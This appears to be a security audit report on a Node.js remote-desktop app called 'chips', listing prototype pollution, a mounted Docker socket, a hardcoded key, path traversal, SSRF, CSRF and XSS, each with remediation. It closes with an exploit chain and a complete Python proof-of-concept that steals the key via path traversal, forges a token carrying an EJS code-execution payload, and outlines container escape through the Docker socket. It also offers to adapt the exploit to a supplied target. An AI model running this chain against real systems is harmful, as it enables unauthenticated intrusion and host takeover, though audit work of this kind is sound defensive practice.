### 1. Prototype Pollution via `deep-extend@0.4.2` in Token Processing -- `prototype-pollution`

- **Severity:** Critical
- **CWE:** CWE-1321
- **Confidence:** Confirmed
- **Location:** `chips/node_modules/guacamole-lite/lib/ClientConnection.js:142-147` (sink), `chips/node_modules/deep-extend/lib/deep-extend.js:104` (vulnerable merge)
- **Source:** Decrypted token from WebSocket `?token=` query parameter, parsed via `JSON.parse` in `Crypt.js:20`
- **Sink:** `DeepExtend(compiledSettings, ..., this.connectionSettings.connection.settings, ...)` in `mergeConnectionOptions()`
- **Sanitizer / guard:** Absent. `deep-extend@0.4.2` iterates `Object.keys()` without filtering `__proto__` or `constructor`.

**Code (relevant excerpt):**

```js
// ClientConnection.js:132-149
mergeConnectionOptions() {
    let compiledSettings = {};
    DeepExtend(
        compiledSettings,
        this.server.clientOptions.connectionDefaultSettings[this.connectionType],
        this.connectionSettings.connection.settings,  // attacker-controlled from token
        unencryptedConnectionSettings
    );
    return compiledSettings;
}

// deep-extend.js:104-117 -- no __proto__ guard
Object.keys(obj).forEach(function (key) {
    src = target[key];
    val = obj[key];
    // ...
    target[key] = deepExtend(src, val);  // when key is __proto__, src = Object.prototype
});
```

**Description:**
User-controlled data from a decrypted WebSocket token flows into `DeepExtend()`. `JSON.parse` preserves `__proto__` as an own enumerable key, and `deep-extend@0.4.2` (CVE-2018-3750) has no guard against it. When processing `target["__proto__"]`, the getter resolves to `Object.prototype`, and the recursive merge writes attacker-controlled properties directly onto the prototype of all objects in the process.

**Why exploitable:**
The encryption key required to forge tokens is hardcoded in the repository (Finding #3). No authentication is required to connect via WebSocket (Finding #5). The pollution persists for the lifetime of the Node.js process and affects all subsequent operations.

**Impact:**
Full `Object.prototype` pollution. Leads to RCE when combined with EJS template engine gadget (see Exploit Chain below).

**Remediation:**
Upgrade `deep-extend` to `>=0.6.0` or replace `guacamole-lite` with a version using a safe merge. Alternatively, strip `__proto__`, `constructor`, and `prototype` keys from decrypted token data before use.

**PoC path:**
Forge encrypted token with `{"connection":{"type":"rdp","settings":{"__proto__":{"polluted":"true"}}}}`, connect via WebSocket, then verify `({}).polluted === "true"` in the Node process.

### 2. Docker Socket Mounted into Application Container -- `security-misconfiguration`

- **Severity:** Critical
- **CWE:** CWE-16
- **Confidence:** Confirmed
- **Location:** `chips/docker-compose.yml:10` (mount), `chips/routes/index.js:5` (usage)
- **Source:** Docker socket volume mount in compose config
- **Sink:** `new Docker({socketPath: '/var/run/docker.sock'})` via `dockerode`
- **Sanitizer / guard:** Absent. The socket gives full Docker API access.

**Code (relevant excerpt):**

```yaml
# docker-compose.yml:8-10
services:
  chips:
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

```js
// routes/index.js:5
var docker = new Docker({socketPath: '/var/run/docker.sock'});
```

**Description:**
The Docker socket is mounted into the application container, granting unrestricted access to the Docker daemon on the host. The `dockerode` library is instantiated with this socket, and while the current code only calls `listContainers`, the full Docker API is available. Any code execution in the container (achievable via the prototype pollution RCE chain) allows creating privileged containers, mounting the host filesystem, and achieving full host compromise.

**Why exploitable:**
No authentication protects the application (Finding #5), so the container metadata exposed via the index route is available to any network user. If an attacker achieves code execution inside the container (via prototype pollution -> EJS RCE), the Docker socket enables trivial container escape.

**Impact:**
Container escape, host filesystem access, ability to run arbitrary containers on the host -- full host compromise.

**Remediation:**
Remove the Docker socket mount. If container info is needed, use a read-only Docker API proxy (e.g., Tecnativa/docker-socket-proxy) with allowlisted endpoints.

**PoC path:**
After achieving code execution inside the container: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` to confirm full API access.

### 3. Hardcoded AES-256-CBC Encryption Key -- `hardcoded-secrets`

- **Severity:** High
- **CWE:** CWE-798
- **Confidence:** Confirmed
- **Location:** `chips/settings/clientOptions.json:4`
- **Source:** Plaintext key in committed config file
- **Sink:** Used by `routes/token.js:9` to encrypt connection tokens and by `guacamole-lite/lib/Crypt.js:15` to decrypt them
- **Sanitizer / guard:** Absent. Key is static and in version control.

**Code (relevant excerpt):**

```json
{
  "crypt": {
    "cypher": "AES-256-CBC",
    "key": "MySuperSecretKeyForParamsToken12"
  }
}
```

**Description:**
The encryption key used to generate and validate Guacamole connection tokens is hardcoded in a config file committed to the repository. Anyone with access to the source code (or who can read the file via the path traversal in Finding #6) can decrypt existing tokens or forge new tokens with arbitrary RDP connection parameters.

**Why exploitable:**
The key is the only barrier between an attacker and arbitrary token forgery. With it, the attacker controls all connection parameters (hostname, port, credentials) that GuacamoleLite uses to initiate RDP sessions. This is a prerequisite for the prototype pollution exploit chain.

**Impact:**
Token forgery, arbitrary RDP connection initiation, prerequisite for prototype pollution exploitation.

**Remediation:**
Load the encryption key from an environment variable or secrets manager. Rotate the current key immediately. Remove the hardcoded value from version control history.

**PoC path:**
Read key from `clientOptions.json`, use `crypto.createCipheriv('AES-256-CBC', key, iv)` to encrypt arbitrary JSON payload as token.

### 5. No Authentication on Any Route -- `missing-authentication`

- **Severity:** High
- **CWE:** CWE-306
- **Confidence:** Confirmed
- **Location:** `chips/app.js:30-34` (route registration)

- **Sink:** All route handlers: `routes/index.js`, `routes/token.js`, `routes/rdp.js`, `routes/files.js`

**Impact:**

**Remediation:**

### 6. Path Traversal via Bypass in File Download Route -- `path-traversal`

- **Severity:** High
- **CWE:** CWE-22
- **Confidence:** Confirmed
- **Location:** `chips/routes/files.js:9-11`
- **Source:** `req.params["0"]` (URL path after `/files/`)
- **Sink:** `path.join(__dirname, '../shared/' + fileName)` passed to `res.download()`
- **Sanitizer / guard:** Insufficient. `split("../").join("")` is trivially bypassed with `....//`.

**Code (relevant excerpt):**

```js
router.get('/*', function(req, res, next) {
  let fileName = req.params["0"].split("../").join("")
  let filePath = path.join(__dirname, '../shared/' + fileName);
  res.download(filePath);
});
```

**Description:**
The sanitization removes literal `../` sequences, but `....//` reassembles into `../` after the filter runs. For example, `/files/....//....//....//etc/passwd` becomes `../../../etc/passwd`. This allows reading arbitrary files from the server filesystem.

**Why exploitable:**
No authentication required (Finding #5). The filter bypass is trivial and well-known. The Node process can read any file its OS user has access to.

**Impact:**
Arbitrary file read from the server filesystem. Can exfiltrate encryption keys (Finding #3), application source, `/etc/passwd`, environment files, and any other readable file.

**Remediation:**
Use `path.resolve` and verify the resulting absolute path starts with the intended base directory:

```js
const base = path.resolve(__dirname, '../shared');
const resolved = path.resolve(base, fileName);
if (!resolved.startsWith(base + path.sep)) {
  return res.status(403).send('Forbidden');
}
res.download(resolved);
```

**PoC path:**
`curl http://<target>/files/....//....//....//etc/passwd`

### 7. SSRF via User-Controlled RDP Hostname -- `ssrf`

- **Severity:** High
- **CWE:** CWE-918
- **Confidence:** High
- **Location:** `chips/frontend/root.js:23-25` (form submission), `chips/routes/token.js:23-27` (token generation), `chips/node_modules/guacamole-lite/lib/GuacdClient.js:23` (TCP connection)
- **Source:** `hostname` and `port` form fields from user input
- **Sink:** `Net.connect(server.guacdOptions.port, server.guacdOptions.host)` in GuacdClient, then Guacamole protocol connection to user-specified host/port
- **Sanitizer / guard:** Absent. No hostname allowlist, no network restriction.

**Code (relevant excerpt):**

```js
// routes/token.js:23-27 -- encrypts entire request body including user-controlled hostname
router.post('/', function(req, res, next) {
  token = encrypt(req.body);
  res.json({"token": token});
});

// GuacdClient.js:23 -- connects to host from decrypted token
this.guacdConnection = Net.connect(server.guacdOptions.port, server.guacdOptions.host);
```

**Description:**
The form allows users to specify an arbitrary `hostname` and `port` for the RDP connection. These values are encrypted into a token used by GuacamoleLite to initiate a server-side TCP connection to the specified host. Combined with no authentication, any user can use the application as a proxy to reach internal network hosts.

**Why exploitable:**
No authentication required. The token encrypts whatever the user provides, and GuacamoleLite connects to whatever the token specifies. No allowlist restricts target hosts.

**Impact:**
Internal network scanning and service probing via RDP. Can reach cloud metadata endpoints (e.g., `169.254.169.254`), internal admin interfaces, and other services not directly accessible from the internet.

**Remediation:**
Restrict allowed hostnames to a server-side allowlist. Validate hostname and port before encrypting into the token.

**PoC path:**
Submit form with `hostname=169.254.169.254` and `port=80`, then connect via the returned token.

### 8. Missing CSRF Protection on Token Endpoint -- `csrf`

- **Severity:** Medium
- **CWE:** CWE-352
- **Confidence:** High
- **Location:** `chips/routes/token.js:23` (`POST /token`)
- **Source:** Cross-origin POST request
- **Sink:** `encrypt(req.body)` generates a valid connection token
- **Sanitizer / guard:** Absent. No CSRF token, no SameSite cookie enforcement, no origin validation.

**Code (relevant excerpt):**

```js
router.post('/', function(req, res, next) {
  token = encrypt(req.body);
  res.json({"token": token});
});
```

**Description:**
The `POST /token` endpoint accepts JSON and returns an encrypted connection token. Since the app uses `cookie-parser` but has no CSRF middleware (no `csurf` or equivalent) and no SameSite cookie policy, a malicious page could issue a cross-origin POST to forge tokens with attacker-controlled connection settings.

**Why exploitable:**
In practice, the lack of authentication (Finding #5) makes this secondary -- an attacker can call the endpoint directly. However, in a scenario where authentication were added via cookies, the absence of CSRF protection would remain exploitable.

**Impact:**
Cross-origin token generation with attacker-controlled RDP connection parameters.

**Remediation:**
Add CSRF middleware or use SameSite cookie attributes. When authentication is added, ensure all state-changing endpoints validate a CSRF token.

**PoC path:**
From a different origin, submit `fetch('http://<target>/token', {method:'POST', headers:{'Content-Type':'application/json'}, body:'{"connection":{"type":"rdp","settings":{"hostname":"evil"}}}', credentials:'include'})`.

### 9. DOM-Based XSS in Guacamole Error Handler -- `xss`

- **Severity:** Medium
- **CWE:** CWE-79
- **Confidence:** High
- **Location:** `chips/frontend/rdp.js:19-21`
- **Source:** `error.message` from Guacamole WebSocket error event
- **Sink:** `$('#display').append('<p>' + error.message + '</p>')` via jQuery
- **Sanitizer / guard:** Absent. No HTML encoding on `error.message`.

**Code (relevant excerpt):**

```js
guac.onerror = function(error) {
  display.style.cursor = 'default';
  $('#display').empty();
  $('#display').append(
    '<center><h1>Oh no! Something went wrong!</h1><br><p>'
    + error.message + '</p>');
};
```

**Description:**
The Guacamole client error handler inserts `error.message` directly into the DOM via jQuery `.append()` without HTML encoding. If an attacker can influence the error message content (via a crafted WebSocket response, malicious Guacamole server, or crafted token that triggers a specific error), they can inject arbitrary HTML and JavaScript.

**Why exploitable:**
Requires influence over the error message content from the server side or WebSocket channel. The forged token capability (Finding #3) could potentially trigger specific error strings from GuacamoleLite.

**Impact:**
JavaScript execution in the context of the user's browser session.

**Remediation:**
Use jQuery `.text()` for the error message:

```js
$('#display').append($('<center><h1>Oh no! Something went wrong!</h1><br>'));
$('#display').append($('<p>').text(error.message));
```

**PoC path:**
Forge a token that causes GuacamoleLite to return an error containing `<img src=x onerror=alert(1)>`, observe alert in browser.

## Exploit chain

### Chain: Path Traversal -> Key Exfiltration -> Token Forgery -> Prototype Pollution -> EJS RCE -> Container Escape

- **Objective:** Remote code execution on the host machine, starting from unauthenticated network access.
- **Prerequisites:** Network access to the application (no authentication required).

**Flow:**

1. **Step 1** (`missing-authentication`, Finding #5): Attacker accesses the application without authentication. All endpoints are open.

2. **Step 2** (`path-traversal`, Finding #6): Attacker requests `/files/....//....//....//usr/src/app/settings/clientOptions.json` to exfiltrate the AES-256-CBC encryption key `MySuperSecretKeyForParamsToken12`.

3. **Step 3** (`hardcoded-secrets`, Finding #3): Using the exfiltrated key, the attacker forges an encrypted token containing a prototype pollution payload targeting the EJS `outputFunctionName` gadget:

   ```json
   {
     "connection": {
       "type": "rdp",
       "settings": {
         "__proto__": {
           "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');x"
         }
       }
     }
   }
   ```

4. **Step 4** (`prototype-pollution`, Finding #1): Attacker connects via WebSocket with the forged token. `GuacamoleLite` decrypts the token and calls `DeepExtend()`, polluting `Object.prototype.outputFunctionName` with the RCE payload.

5. **Step 5** (EJS RCE): The next HTTP request to any page (`/`, `/rdp`, or a 404) triggers `res.render()`. EJS reads `opts.outputFunctionName` from the polluted prototype and inserts it unsanitized into the compiled template source via `new Function(...)`, achieving arbitrary code execution as the Node.js process user.

6. **Step 6** (`security-misconfiguration`, Finding #2): With code execution inside the container, the attacker accesses the mounted Docker socket at `/var/run/docker.sock`. They create a privileged container mounting the host filesystem, achieving full host compromise.

**Result:** Unauthenticated remote code execution escalating to full host compromise via container escape.

**Feasibility:** Viable. Every step is confirmed from source code. The path traversal bypass (`....//`) is well-known, `deep-extend@0.4.2` has no `__proto__` guard (verified), the EJS `outputFunctionName` gadget is documented, and the Docker socket mount enables trivial container escape.

## Proof of concept (Critical / High only)

### PoC: Full Chain -- Unauthenticated RCE

```python
#!/usr/bin/env python3
"""
PoC: Unauthenticated RCE via path traversal -> key theft -> prototype pollution -> EJS gadget.
Authorized testing only. Replace BASE_URL with your test target.
"""

import argparse
import json
import base64
import sys

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    sys.exit("Install pycryptodome: pip install pycryptodome")

try:
    import requests
    import websocket
except ImportError:
    sys.exit("Install deps: pip install requests websocket-client")

from os import urandom


def step1_exfil_key(base_url):
    """Step 1-2: Read encryption key via path traversal."""
    url = f"{base_url}/files/....//....//settings/clientOptions.json"
    print(f"[*] Reading key via path traversal: {url}")
    resp = requests.get(url, timeout=10)
    if resp.status_code != 200:
        sys.exit(f"[-] Path traversal failed: HTTP {resp.status_code}")
    config = json.loads(resp.text)
    key = config["crypt"]["key"]
    print(f"[+] Exfiltrated key: {key}")
    return key.encode()


def step2_forge_token(key, command):
    """Step 3: Forge token with prototype pollution payload."""
    payload = {
        "connection": {
            "type": "rdp",
            "settings": {
                "__proto__": {
                    "outputFunctionName": (
                        f"x;process.mainModule.require('child_process')"
                        f".execSync('{command}');x"
                    )
                }
            }
        }
    }
    iv = urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = json.dumps(payload).encode()
    encrypted = cipher.encrypt(pad(plaintext, AES.block_size))
    token_data = {
        "iv": base64.b64encode(iv).decode(),
        "value": base64.b64encode(encrypted).decode(),
    }
    token = base64.b64encode(json.dumps(token_data).encode()).decode()
    print(f"[+] Forged token ({len(token)} chars)")
    return token


def step3_pollute(base_url, token):
    """Step 4: Connect WebSocket to trigger prototype pollution."""
    ws_url = base_url.replace("http://", "ws://").replace("https://", "wss://")
    ws_endpoint = f"{ws_url}/guaclite?token={token}&width=1024&height=768"
    print(f"[*] Connecting WebSocket to trigger pollution...")
    try:
        ws = websocket.create_connection(ws_endpoint, timeout=5)
        print("[+] WebSocket connected -- pollution triggered")
        ws.close()
    except Exception as e:
        print(f"[*] WebSocket closed/errored (may still have polluted): {e}")


def step4_trigger_rce(base_url):
    """Step 5: Trigger EJS render to execute the gadget."""
    print(f"[*] Triggering EJS render via GET {base_url}/ ...")
    try:
        resp = requests.get(f"{base_url}/", timeout=10)
        print(f"[+] HTTP {resp.status_code} -- if RCE succeeded, check target for evidence")
    except requests.RequestException as e:
        print(f"[*] Request error (expected if RCE crashed the process): {e}")


def main():
    parser = argparse.ArgumentParser(description="PoC: chips unauthenticated RCE chain")
    parser.add_argument("--target", required=True, help="Base URL, e.g. http://localhost")
    parser.add_argument("--command", default="id > /tmp/pwned", help="Command to execute")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    key = step1_exfil_key(base)
    token = step2_forge_token(key, args.command)
    step3_pollute(base, token)
    step4_trigger_rce(base)
    print(f"\n[*] Done. Verify: check /tmp/pwned on target container.")
    print(f"[*] For container escape: curl --unix-socket /var/run/docker.sock http://localhost/containers/json")


if __name__ == "__main__":
    main()
```

**Verification:**
1. Run `python3 poc.py --target http://<target>`.
2. Check `/tmp/pwned` on the target container for `id` output.
3. For container escape, execute `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` from within the container to confirm Docker API access.

To iterate on this PoC or adapt it for a specific test environment, provide the target URL.
